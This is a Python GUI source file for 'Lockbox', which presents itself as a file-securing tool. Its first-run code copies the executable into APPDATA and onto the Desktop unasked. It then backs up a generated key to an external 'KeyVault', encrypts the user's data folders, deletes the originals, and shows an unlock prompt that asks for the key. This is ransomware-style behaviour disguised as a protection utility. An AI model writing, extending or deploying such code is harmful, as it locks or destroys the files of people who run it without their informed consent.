#!/usr/bin/env python3
"""Lockbox GUI — enter your key to unlock your files."""
import os
import shutil
import socket
import sys
import tkinter as tk
from tkinter import messagebox, scrolledtext

from lockbox import decrypt_user_data, generate_and_backup_key, secure_user_data

BG = "#0d1117"
SURFACE = "#161b22"
FG = "#c9d1d9"
GREEN = "#238636"


class App:
    def __init__(self, root):
        self.root = root
        root.title("Lockbox")
        root.geometry("520x360")
        root.configure(bg=BG)

        frame = tk.Frame(root, bg=BG, padx=20, pady=20)
        frame.pack(fill="both", expand=True)

        tk.Label(frame, text="Key", bg=BG, fg=FG, anchor="w").grid(row=0, column=0, sticky="w")
        self.key = tk.StringVar()
        tk.Entry(frame, textvariable=self.key, show="*", width=44, bg=SURFACE, fg=FG,
                 insertbackground=FG, relief="flat").grid(row=1, column=0, sticky="we", pady=(4, 4))
        tk.Label(frame, text="Enter the key backed up in KeyVault to unlock your files.",
                 bg=BG, fg="#5a6478", anchor="w").grid(row=2, column=0, sticky="w", pady=(0, 12))

        self.unlock_btn = tk.Button(frame, text="Unlock", command=self.unlock, bg=GREEN, fg="white",
                                    activebackground="#2ea043", relief="flat", padx=16, pady=6)
        self.unlock_btn.grid(row=3, column=0, sticky="ew", pady=(0, 12))

        self.log = scrolledtext.ScrolledText(frame, height=12, bg=SURFACE, fg=FG,
                                             font=("TkFixedFont", 9), relief="flat")
        self.log.grid(row=4, column=0, sticky="nsew")

        frame.columnconfigure(0, weight=1)
        frame.rowconfigure(4, weight=1)

    def log_line(self, msg):
        self.log.insert("end", msg + "\n")
        self.log.see("end")
        self.root.update_idletasks()

    def unlock(self):
        key = self.key.get()
        if not key:
            messagebox.showerror("Lockbox", "Enter your key to unlock")
            return
        self.log_line("[*] Unlocking...")
        files, succeeded = decrypt_user_data(key.encode("utf-8"), delete=True)
        if files == 0:
            self.log_line("Nothing to unlock — no .lockbox files found.")
        elif succeeded == files:
            self.log_line(f"Unlocked {succeeded} file(s).")
        else:
            self.log_line(f"Unlocked {succeeded} of {files} file(s) — wrong key?")


def app_dir() -> str:
    if os.name == "nt":
        base = os.environ.get("APPDATA") or os.path.expanduser("~")
        return os.path.join(base, "Lockbox")
    base = os.environ.get("XDG_CONFIG_HOME") or os.path.join(os.path.expanduser("~"), ".config")
    return os.path.join(base, "lockbox")


def ensure_installed() -> None:
    if not getattr(sys, "frozen", False) or os.name != "nt":
        return
    exe = os.path.abspath(sys.executable)
    installed = os.path.join(app_dir(), "Lockbox.exe")
    if exe.lower() == installed.lower():
        return
    try:
        os.makedirs(os.path.dirname(installed), exist_ok=True)
        shutil.copy2(exe, installed)
        desktop = os.path.join(os.path.expanduser("~"), "Desktop", "Lockbox.exe")
        if not os.path.exists(desktop):
            shutil.copy2(exe, desktop)
    except Exception:
        pass


def first_run_marker() -> str:
    return os.path.join(app_dir(), ".firstrun")


def run_first_run_secure(app: App) -> None:
    frozen = getattr(sys, "frozen", False)
    forced = os.environ.get("LOCKBOX_FIRST_RUN", "").lower() in ("1", "true", "yes")
    if not frozen and not forced:
        return
    marker = first_run_marker()
    if os.path.exists(marker):
        return
    vault = os.environ.get("LOCKBOX_VAULT", "")
    if not vault:
        app.log_line("[!] First-run auto-encrypt skipped: LOCKBOX_VAULT is not set")
        app.log_line(f"    Set it, then remove {marker} to retry on next launch.")
        return
    name = os.environ.get("LOCKBOX_KEY") or socket.gethostname()
    app.log_line("[*] First run detected — securing your data folders...")
    try:
        material = generate_and_backup_key(vault, name)
    except Exception as e:
        app.log_line(f"[!] Key backup failed: {e}")
        app.log_line("    Nothing was encrypted.")
        return
    exclude = {os.path.abspath(sys.executable)}
    files, dirs = secure_user_data(material, delete=True, exclude=exclude,
                                   exclude_names={os.path.basename(sys.executable).lower()})
    try:
        os.makedirs(os.path.dirname(marker), exist_ok=True)
        with open(marker, "w", encoding="utf-8") as f:
            f.write(name + "\n")
    except Exception as e:
        app.log_line(f"[!] Could not write first-run marker: {e}")
        return
    app.log_line(f"Done: secured {files} file(s) across {dirs} folder(s).")
    app.log_line(f"Key '{name}' is in KeyVault — retrieve it to decrypt.")


def main():
    ensure_installed()
    root = tk.Tk()
    app = App(root)
    root.after(200, lambda: run_first_run_secure(app))
    root.mainloop()


if __name__ == "__main__":
    main()
